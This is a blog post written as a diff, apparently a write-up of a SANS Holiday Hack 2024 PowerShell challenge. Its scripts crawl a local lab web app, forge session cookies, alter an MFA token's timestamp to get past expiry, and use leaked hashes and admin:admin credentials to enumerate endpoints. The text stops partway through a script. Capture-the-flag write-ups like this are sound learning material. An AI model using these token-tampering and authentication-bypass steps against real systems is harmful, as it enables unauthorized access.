@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HHC24 - Powershell · Journey into IT Knowledge
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="ArmBraker 👨‍💻">
+<meta name="description" content="Powershell challenge aimed for web-based application">
+<meta name="keywords" content="blog,knowledge,IT Security,hacking,personal,networking">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HHC24 - Powershell">
+  <meta name="twitter:description" content="Powershell challenge aimed for web-based application">
+
+<meta property="og:url" content="https://armbraker.github.io/blog/posts/hhc24/powershell/">
+  <meta property="og:site_name" content="Journey into IT Knowledge">
+  <meta property="og:title" content="HHC24 - Powershell">
+  <meta property="og:description" content="Powershell challenge aimed for web-based application">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-26T14:58:33+01:00">
+    <meta property="article:modified_time" content="2025-01-26T14:58:33+01:00">
+    <meta property="article:tag" content="HHC24">
+    <meta property="article:tag" content="Sans">
+    <meta property="article:tag" content="CTF">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/frostbitdeactivation/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/elfstack/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/santavision/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/dronmagedon/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/snowball-showdown/">
+      <meta property="og:see_also" content="https://armbraker.github.io/blog/posts/hhc24/hardwarehacking_101/">
+
+
+
+
+<link rel="canonical" href="https://armbraker.github.io/blog/posts/hhc24/powershell/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/blog/css/coder.min.f04d4c2b3aa2d369dd0f02bc87d53b60d811a0f74526c9ef8a434ee3248b3606.css" integrity="sha256-8E1MKzqi02ndDwK8h9U7YNgRoPdFJsnvikNO4ySLNgY=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/blog/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://armbraker.github.io/blog/">
+      Journey into IT Knowledge
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/">Home</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/blog/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://armbraker.github.io/blog/posts/hhc24/powershell/">
+              HHC24 - Powershell
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-01-26T14:58:33&#43;01:00">
+                January 26, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              7-minute read
+            </span>
+          </div>
+          
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/blog/categories/writeup/">Writeup</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/poweshell/">Poweshell</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/automation/">Automation</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/web-application-hacking/">Web-Application Hacking</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/authorization/">Authorization</a>
+      <span class="separator">•</span>
+    <a href="/blog/categories/authentication/">Authentication</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/blog/tags/hhc24/">HHC24</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/blog/tags/sans/">Sans</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/blog/tags/ctf/">CTF</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h2 id="silver-">
+  Silver 🥈
+  <a class="heading-link" href="#silver-">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<ul>
+<li>
+<p><strong>Disclaimer</strong>: I started doing this challenge during my frustration for GOLD stage of Snowball challenge, so I started to make notes in later stage&hellip;</p>
+</li>
+<li>
+<p>Looking for endpoint which had content of 138 words.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ff6ac1">foreach</span> (<span style="color:#ff5c57">$link</span> <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">$links</span>.href){
+</span></span><span style="display:flex;"><span>   <span style="color:#ff6ac1">if</span> ((<span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$link</span> -Headers <span style="color:#ff5c57">$Headers</span> | <span style="color:#ff5c57">Measure-Object</span> -word).Words <span style="color:#ff6ac1">-eq</span> <span style="color:#ff9f43">138</span>){
+</span></span><span style="display:flex;"><span>    (<span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$link</span> -Headers <span style="color:#ff5c57">$Headers</span>).content
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>} 
+</span></span></code></pre></div><h3 id="stage-8">
+  Stage 8
+  <a class="heading-link" href="#stage-8">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span><span style="color:#ff5c57">Import-Csv</span> = @(<span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#5af78e">&#39;http://127.0.0.1:1225/token_overview.csv&#39;</span> -Headers <span style="color:#ff5c57">$Headers</span>).content
+</span></span><span style="display:flex;"><span>5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
+</span></span></code></pre></div><h3 id="stage-9">
+  Stage 9
+  <a class="heading-link" href="#stage-9">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span><span style="color:#78787e"># Create a new web request session</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$session</span> = <span style="color:#ff5c57">New-Object</span> Microsoft.PowerShell.Commands.WebRequestSession
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Create a new cookie and set the name, value, and domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$cookie</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;token&#39;</span>, <span style="color:#5af78e">&#39;5f8dd236f862f4507835b0e418907ffc&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$cookie</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Add the cookie to the session&#39;s cookie container</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Define the API endpoint</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$link</span> = <span style="color:#5af78e">&#34;http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Send the GET request with the web request session</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$response</span> = <span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$link</span> -WebSession <span style="color:#ff5c57">$session</span> -Headers <span style="color:#ff5c57">$Headers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Output the response content</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$response</span>.Content
+</span></span></code></pre></div><h3 id="stage-10">
+  Stage 10
+  <a class="heading-link" href="#stage-10">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">h1</span>&gt;Cookie &#39;mfa_code&#39;, use it at &lt;<span style="color:#ff6ac1">a</span> <span style="color:#57c7ff">href</span><span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#39;1732994526.5978212&#39;</span>&gt;/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C&lt;/<span style="color:#ff6ac1">a</span>&gt;&lt;/<span style="color:#ff6ac1">h1</span>&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#78787e"># Create URI parameter</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$link</span> = <span style="color:#5af78e">&#34;http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Create a new web request session</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Create a new cookie and set the name, value, and domain</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$cookie</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;mfa_token&#39;</span>, <span style="color:#5af78e">&#39;1732994526.5978212&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$cookie</span>.Domain = <span style="color:#5af78e">&#34;127.0.0.1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Add the cookie to the session&#39;s cookie container</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$session</span>.Cookies.Add(<span style="color:#ff5c57">$cookie</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Send the GET request with the web request session</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$response</span> = <span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$link</span> -WebSession <span style="color:#ff5c57">$session</span> -Headers <span style="color:#ff5c57">$Headers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Output the response content</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$response</span>.Content
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">h1</span>&gt;[!] System currently in lock down&lt;/<span style="color:#ff6ac1">h1</span>&gt;&lt;<span style="color:#ff6ac1">br</span>&gt;&lt;<span style="color:#ff6ac1">h1</span>&gt;[!] Failure, token has expired. [*] Default timeout set to 2s for security reasons&lt;/<span style="color:#ff6ac1">h1</span>&gt;
+</span></span></code></pre></div><ul>
+<li>The token needs to be modified for longer validity:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ff5c57">$cookie</span> = <span style="color:#ff5c57">New-Object</span> System.Net.Cookie(<span style="color:#5af78e">&#39;mfa_token&#39;</span>, <span style="color:#5af78e">&#39;9932994526.5978212&#39;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff6ac1">h1</span>&gt;[+] Success&lt;/<span style="color:#ff6ac1">h1</span>&gt;&lt;<span style="color:#ff6ac1">br</span>&gt;&lt;<span style="color:#ff6ac1">p</span>&gt;Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==&lt;/<span style="color:#ff6ac1">p</span>&gt;
+</span></span></code></pre></div><ul>
+<li>Base64 Decode: <code>Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ff5c57">$username</span> =  <span style="color:#5af78e">&#39;elf&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$password</span> = <span style="color:#5af78e">&#39;SnowLeopard2ReadyForAction&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$credentials</span> = [<span style="color:#ff9f43">Convert</span>]::ToBase64String([<span style="color:#ff9f43">Text.Encoding</span>]::ASCII.GetBytes((<span style="color:#5af78e">&#34;{0}:{1} -f </span><span style="color:#ff5c57">$username</span><span style="color:#5af78e">, </span><span style="color:#ff5c57">$password</span><span style="color:#5af78e">&#34;</span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$BasicAuth</span> = <span style="color:#5af78e">&#34;Basic </span><span style="color:#ff5c57">$credentials</span><span style="color:#5af78e">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$Headers</span> = @{ Authorization = <span style="color:#ff5c57">$BasicAuth</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Invoke-WebRequest</span> -Uri <span style="color:#ff5c57">$link</span> -WebSession <span style="color:#ff5c57">$webSession</span> -Headers
+</span></span></code></pre></div><ul>
+<li>Silver was obtained 🥈</li>
+</ul>
+<h2 id="gold-">
+  Gold 🥇
+  <a class="heading-link" href="#gold-">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p><strong>Summary:</strong></p>
+<ul>
+<li><strong>Basic Auth</strong> admin:admin</li>
+<li><strong>Base URL</strong>: &ldquo;127.0.0.1:1225&rdquo;</li>
+</ul>
+<p>From previous stages we have following log message:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span><span style="font-weight:bold"># [*] SYSTEMLOG
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"># [*] defense mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"># [-] ERROR, memory corruption, not all endpoints have been REDACTED
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"># [*] Verification endpoint still active
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"># [*] http://127.0.0.1:1225/tokens/&lt;sha256sum&gt;
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"># [*] Contact system administrator to unlock panic mode
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"># [*] Site functionality at minimum to keep weapons active
+</span></span></span><span style="display:flex;"><span><span style="font-weight:bold"></span>&#34; to type &#34;System.Char&#34;. Error: &#34;String must be exactly one character long.&#34;
+</span></span></code></pre></div><p>According to this and information provided from Elf, we need to make <strong>SHA256SUM</strong> of <strong>MD5 Tokens</strong> to get new endpoint.</p>
+<p>MD5 Tokens:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>32b9401a6d972f8c1a98de145629ea9d,REDACTED
+</span></span><span style="display:flex;"><span>3a79238df0a92ab0afa44a85f914fc3b,REDACTED
+</span></span><span style="display:flex;"><span>49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
+</span></span><span style="display:flex;"><span>f8142c1304efb9b7e9a7f57363c2d286,REDACTED
+</span></span><span style="display:flex;"><span>706457f6dd78729a8bed5bae1efaeb50,REDACTED
+</span></span><span style="display:flex;"><span>bb0564aa5785045937a35a9fa3fbbc73,REDACTED
+</span></span><span style="display:flex;"><span>4173a7bc22aee35c5fc48261b041d064,REDACTED
+</span></span><span style="display:flex;"><span>198b8bf2cd30a7c7fed464cca1720a88,REDACTED
+</span></span><span style="display:flex;"><span>3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
+</span></span><span style="display:flex;"><span>288e60e318d9ad7d70d743a614442ffc,REDACTED
+</span></span><span style="display:flex;"><span>87ab4cb29649807fdb716ac85cf560ea,REDACTED
+</span></span><span style="display:flex;"><span>89f3ec1275407c9526a645602d56e799,REDACTED
+</span></span><span style="display:flex;"><span>33539252b40b5c244b09aee8a57adbc9,REDACTED
+</span></span><span style="display:flex;"><span>152899789a191d9e9150a1e3a5513b7f,REDACTED
+</span></span><span style="display:flex;"><span>7cd48566f118a02f300cdfa75dee7863,REDACTED
+</span></span><span style="display:flex;"><span>d798a55fca64118cea2df3c120f67569,REDACTED
+</span></span><span style="display:flex;"><span>6ef5570cd43a3ec9f43c57f662201e55,REDACTED
+</span></span><span style="display:flex;"><span>bf189d47c3175ada98af398669e3cac3,REDACTED
+</span></span><span style="display:flex;"><span>743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
+</span></span><span style="display:flex;"><span>270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
+</span></span><span style="display:flex;"><span>8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
+</span></span><span style="display:flex;"><span>6fd00cbda10079b1d55283a88680d075,REDACTED
+</span></span><span style="display:flex;"><span>612001dd92369a7750c763963bc327f0,REDACTED
+</span></span><span style="display:flex;"><span>010f2cc580f74521c86215b7374eead6,REDACTED
+</span></span><span style="display:flex;"><span>29860c67296d808bc6506175a8cbb422,REDACTED
+</span></span><span style="display:flex;"><span>7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
+</span></span><span style="display:flex;"><span>45ffb41c4e458d08a8b08beeec2b4652,REDACTED
+</span></span><span style="display:flex;"><span>d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
+</span></span><span style="display:flex;"><span>bd7efda0cb3c6d15dd896755003c635c,REDACTED
+</span></span><span style="display:flex;"><span>5be8911ced448dbb6f0bd5a24cc36935,REDACTED
+</span></span><span style="display:flex;"><span>1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
+</span></span><span style="display:flex;"><span>0f262d0003bd696550744fd43cd5b520,REDACTED
+</span></span><span style="display:flex;"><span>8cac896f624576d825564bb30c7250eb,REDACTED
+</span></span><span style="display:flex;"><span>8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
+</span></span><span style="display:flex;"><span>b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
+</span></span><span style="display:flex;"><span>38bdd7748a70529e9beb04b95c09195d,REDACTED
+</span></span><span style="display:flex;"><span>8d4366f08c013f5c0c587b8508b48b15,REDACTED
+</span></span><span style="display:flex;"><span>67566692ca644ddf9c1344415972fba8,REDACTED
+</span></span><span style="display:flex;"><span>8fbf4152f89b7e309e89b9f7080c7230,REDACTED
+</span></span><span style="display:flex;"><span>936f4db24a290032c954073b3913f444,REDACTED
+</span></span><span style="display:flex;"><span>c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
+</span></span><span style="display:flex;"><span>cb722d0b55805cd6feffc22a9f68177d,REDACTED
+</span></span><span style="display:flex;"><span>724d494386f8ef9141da991926b14f9b,REDACTED
+</span></span><span style="display:flex;"><span>67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
+</span></span><span style="display:flex;"><span>5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
+</span></span></code></pre></div><p>Know endpoint:
+<a href="http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C"  class="external-link" target="_blank" rel="noopener">http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></p>
+<p>Let&rsquo;s create a script which will create SHA256 from tokens and access the endpoints:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span><span style="color:#78787e"># Define the hashes as a comma-separated string</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$temp_hash</span> = <span style="color:#5af78e">&#34;32b9401a6d972f8c1a98de145629ea9d,3a79238df0a92ab0afa44a85f914fc3b,49c2a68b21b9982aa9fd64cf0fd79f72,f8142c1304efb9b7e9a7f57363c2d286,706457f6dd78729a8bed5bae1efaeb50,bb0564aa5785045937a35a9fa3fbbc73,4173a7bc22aee35c5fc48261b041d064,198b8bf2cd30a7c7fed464cca1720a88,3a7c8ecffeeadb164c31559f8f24a1e7,288e60e318d9ad7d70d743a614442ffc,87ab4cb29649807fdb716ac85cf560ea,89f3ec1275407c9526a645602d56e799,33539252b40b5c244b09aee8a57adbc9,152899789a191d9e9150a1e3a5513b7f,7cd48566f118a02f300cdfa75dee7863,d798a55fca64118cea2df3c120f67569,6ef5570cd43a3ec9f43c57f662201e55,bf189d47c3175ada98af398669e3cac3,743ac25389a0b430dd9f8e72b2ec9d7f,270aabd5feaaf40185f2effa9fa2cd6e,8b58850ee66bd2ab7dd2f5f850c855f8,6fd00cbda10079b1d55283a88680d075,612001dd92369a7750c763963bc327f0,010f2cc580f74521c86215b7374eead6,29860c67296d808bc6506175a8cbb422,7b7f6891b6b6ab46fe2e85651db8205f,45ffb41c4e458d08a8b08beeec2b4652,d0e6bfb6a4e6531a0c71225f0a3d908d,bd7efda0cb3c6d15dd896755003c635c,5be8911ced448dbb6f0bd5a24cc36935,1acbfea6a2dad66eb074b17459f8c5b6,0f262d0003bd696550744fd43cd5b520,8cac896f624576d825564bb30c7250eb,8ef6d2e12a58d7ec521a56f25e624b80,b4959370a4c484c10a1ecc53b1b56a7d,38bdd7748a70529e9beb04b95c09195d,8d4366f08c013f5c0c587b8508b48b15,67566692ca644ddf9c1344415972fba8,8fbf4152f89b7e309e89b9f7080c7230,936f4db24a290032c954073b3913f444,c44d8d6b03dcd4b6bf7cb53db4afdca6,cb722d0b55805cd6feffc22a9f68177d,724d494386f8ef9141da991926b14f9b,67c7aef0d5d3e97ad2488babd2f4c749&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># $temp_hash = &#34;5f8dd236f862f4507835b0e418907ffc&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Split the hashes into an array</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$temp_hash</span> = <span style="color:#ff5c57">$temp_hash</span>.Split(<span style="color:#5af78e">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Generate temporary files for each hash</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">foreach</span> (<span style="color:#ff5c57">$hash</span> <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">$temp_hash</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">Set-Content</span> -Path <span style="color:#5af78e">&#34;</span><span style="color:#ff5c57">$hash</span><span style="color:#5af78e">.txt&#34;</span> -Value <span style="color:#ff5c57">$hash</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Get the list of temporary files</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$temp_files</span> = <span style="color:#ff5c57">Get-ChildItem</span> -Filter *.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Calculate file hashes and prepare the result object</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$result</span> = <span style="color:#ff6ac1">foreach</span> (<span style="color:#ff5c57">$file</span> <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">$temp_files</span>) {
+</span></span><span style="display:flex;"><span>    [<span style="color:#ff9f43">PSCustomObject</span>]@{
+</span></span><span style="display:flex;"><span>        hash  = (<span style="color:#ff5c57">Get-FileHash</span> <span style="color:#ff5c57">$file</span>.FullName).Hash
+</span></span><span style="display:flex;"><span>        token = <span style="color:#ff5c57">$file</span>.Name <span style="color:#ff6ac1">-replace</span> <span style="color:#5af78e">&#34;\.txt$&#34;</span>, <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Remove the temporary files</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">Remove-Item</span> *.txt
+</span></span></code></pre></div><ul>
+<li>Now we have the hashes and we need to enumerate the endpoint, however I loose my script for that, but it is not important as we need to use it as skeleton for next part.</li>
+<li>Same as for silver, we need to send the token to get MFA validation.</li>
+<li>Problem is that we need to validate the token for each endpoint 10 times. &lt;- This we know from Elf&rsquo;s hints as protection EDR (Elf Detection and Response)</li>
+<li>All wrapped in one script:</li>
+<li><em>I know it is not the prettiest script, but I have to modified it on run and debug as I was getting <code>500 Internal error</code></em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span><span style="color:#78787e"># Basic authentication setup</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$username</span> = <span style="color:#5af78e">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$password</span> = <span style="color:#5af78e">&#39;admin&#39;</span>
